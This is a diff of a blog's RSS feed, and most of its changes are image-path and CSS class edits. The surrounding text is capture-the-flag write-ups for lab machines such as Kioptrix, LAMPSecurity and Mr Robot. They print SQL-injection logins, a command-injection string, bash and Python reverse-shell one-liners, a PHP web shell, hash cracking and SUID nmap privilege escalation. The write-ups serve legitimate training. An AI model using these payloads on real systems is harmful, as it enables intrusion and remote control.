-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/webshell# nc -lvp 80
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/webshell# nc -lvp 80
 listening on [any] 80 ...
 connect to [10.10.14.6] from beep.localdomain [10.10.10.7] 46497
 sh: no job control in this shell
@@ -580,7 +580,7 @@ cat /home/fanis/user.txt
 
 &lt;p&gt;There were different ways to get the root flag:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo -l
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo -l
 sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
@@ -614,7 +614,7 @@ bash-3.2$ cat /root/root.txt
 cat /root/root.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo nmap --interactive
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo nmap --interactive
 sudo nmap --interactive
 
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
@@ -647,7 +647,7 @@ nmap&amp;gt;
 
 &lt;p&gt;You can find our write-up &lt;a href=&quot;https://github.com/16667/Metasploitable-3-CTF&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-27-metasploitable3-ctf/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-12-27-metasploitable3-ctf/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Wed, 27 Dec 2017 22:30:00 +0100</pubDate>
         <link>http://localhost:4000/blog/metasploitable3-ctf/</link>
@@ -668,7 +668,7 @@ nmap&amp;gt;
 
 &lt;p&gt;As always I started to enumerate with nmap:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-07 00:18 CET
 Nmap scan report for 192.168.1.26
 Host is up (0.0014s latency).
@@ -685,29 +685,29 @@ PORT     STATE SERVICE  VERSION
 
 &lt;p&gt;On port 80 there was this vulnerable login:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;By using ‘ or 1=1 — – as username I successfully logged in:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;There was this “Basic Administrative Web Console”.  By giving an ip address, it performed a ping command:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Nice!!! It looked like a Command Injection Vulnerability!!! I succesfully executed a “ls” command by using this input:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;ls
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;ls
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I opened a reverse shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.24/4444 0&amp;gt;&amp;amp;1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.24/4444 0&amp;gt;&amp;amp;1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nc -l 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nc -l 4444
 bash: no job control in this shell
 bash-3.00$ id
 uid=48(apache) gid=48(apache) groups=48(apache)
@@ -717,7 +717,7 @@ Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 
 
 &lt;p&gt;I noticed that this linux kernel version was vulnerable to this &lt;a href=&quot;https://www.exploit-db.com/exploits/9542/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.00$ gcc exp.c -o exp
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.00$ gcc exp.c -o exp
 bash-3.00$ ./exp
 sh: no job control in this shell
 sh-3.00# id
@@ -745,7 +745,7 @@ uid=0(root) gid=0(root) groups=48(apache)
 
 &lt;p&gt;Ok let’s start to enumerate the services:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org
 
 PORT      STATE  SERVICE     VERSION
 22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
@@ -760,31 +760,31 @@ Device type: general purpose|storage-misc|broadband router|media device|WAP
 
 &lt;p&gt;I ran dirsearch and in the meanwhile I seen the web site on port 80:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;On port 8080 there was this login:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;The login was vulneable to SQL Injection. I logged in with ‘ or 1=1 — -. There was a kind of CMS:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I uploaded a shell by creating a new reading:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Before that, Dirsearch showed me the directory with all the uploaded files:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok the shell worked:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I used this python payload to open a reverse shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
 socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0); 
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 ([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
@@ -792,7 +792,7 @@ os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
 
 &lt;p&gt;And it worked:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nc -lvp 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nc -lvp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from [212.83.142.84] port 4444 [tcp/*] accepted (family 2, sport 57758)
 sh: no job control in this shell
@@ -805,7 +805,7 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_
 
 &lt;p&gt;After some local enumerations, I found the credentials of mysql in a php page, so I accessed to mysql and I found some interesting credentials:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ mysql -u root
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ mysql -u root
 mysql -u root
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 26
@@ -876,11 +876,11 @@ select username,password from users;
 
 &lt;p&gt;I used Crackstation to crack all the hashes:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;At this point I tried to become the user brian:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ su brian
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ su brian
 su brian
 Password: my2cents
 [brian@localhost inc]$ id
@@ -890,7 +890,7 @@ uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin)
 
 &lt;p&gt;The user Brian was a sudo user, and I become root:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[brian@localhost inc]$ sudo su
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[brian@localhost inc]$ sudo su
 sudo su
 
 We trust you have received the usual lecture from the local System
@@ -931,7 +931,7 @@ cat /passwd
 
 &lt;p&gt;I ran nmap:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sV -Pn 192.168.1.17
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sV -Pn 192.168.1.17
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
@@ -940,7 +940,7 @@ cat /passwd
   &lt;li&gt;-Pn: skip host discovery (I had problems with ICMP echo request packets)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
 Nmap scan report for linux.homenet.telecomitalia.it (192.168.1.17)
 Host is up (0.0014s latency).
 Not shown: 997 filtered ports
@@ -954,39 +954,39 @@ PORT STATE SERVICE VERSION
 
 &lt;p&gt;The website was the same on port 80 and 443:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It was an animated console on a fsociety machine 😛&lt;/p&gt;
 
 &lt;p&gt;But… look at this:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;First Key :&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;073403c8a58a1f80d943455fb30724b9
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;073403c8a58a1f80d943455fb30724b9
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;There was a wordpress blog on the website. I tried to enumerate users with wpscan, but it didn’t work. After some attempts, I found that ‘eliot’ was a valid username. I ran wpscan to bruteforce the wordpress login for user ‘eliot’ with the dictionary file ‘fsocity.dic’. The password was:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ER28–0652
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ER28–0652
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;After logged in, I uploaded a php shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php passthru($_GET[“cmd”]); ?&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php passthru($_GET[“cmd”]); ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;I spawned a TTY shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh: 0: can’t access tty; job control turned off
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh: 0: can’t access tty; job control turned off
 $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ python -c “import pty;pty.spawn(‘/bin/bash’);”
@@ -995,7 +995,7 @@ daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2016/10$
 
 &lt;p&gt;Ok I found this:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot$ ls -l
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot$ ls -l
 ls -l
 total 8
 -r——– 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
@@ -1004,12 +1004,12 @@ total 8
 
 &lt;p&gt;I didn’t have permission to read the second key but I found something in the password.raw-md5 file:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:c3fcd3d76192e4007dfb496cca67e13b
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:c3fcd3d76192e4007dfb496cca67e13b
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;I used Crack Station and I got the second key:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:abcdefghijklmnopqrstuvwxyz
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:abcdefghijklmnopqrstuvwxyz
 
 daemon@linux:/home/robot$ su – robot
 su – robot
@@ -1024,7 +1024,7 @@ cat key-2-of-3.txt
 
 &lt;p&gt;After some local enumeration, I found nmap with SUID set to root on the system. This &lt;a href=&quot;http://www.exploit-db.com/papers/18168/&quot;&gt;paper&lt;/a&gt; explains how to get a root shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:/usr/local/bin$ ls -l
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:/usr/local/bin$ ls -l
 ls -l
 total 496
 -rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
@@ -1064,7 +1064,7 @@ nmap&amp;gt; ! cat /root/key-3-of-3.txt
 
 &lt;p&gt;I ran nmap to see which services were open:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf04.root-me.org
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf04.root-me.org
 Password:
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-13 22:39 CEST
@@ -1095,39 +1095,39 @@ Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
 
 &lt;p&gt;How we can see there were a lot of services, but first let’s see the website on port 80. I found a Local File Inclusion (LFI) Vulnerability:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include_once(inc/pagina.php.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include_once(inc/pagina.php.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
 
 Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php’ for inclusion (include_path=’.:/usr/share/pear:/usr/share/php’) in /var/www/html/index.php on line 6
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I found this &lt;a href=&quot;http://www.securityfocus.com/bid/34508&quot;&gt;vulnerability&lt;/a&gt; for NanoCMS (DirBuster found the same file):&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok I got the username and password hash:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Authentication was successful, I created a new page containing a classic “&lt;?php passthru($_GET[“cmd”]); ?&gt;”:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”])
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
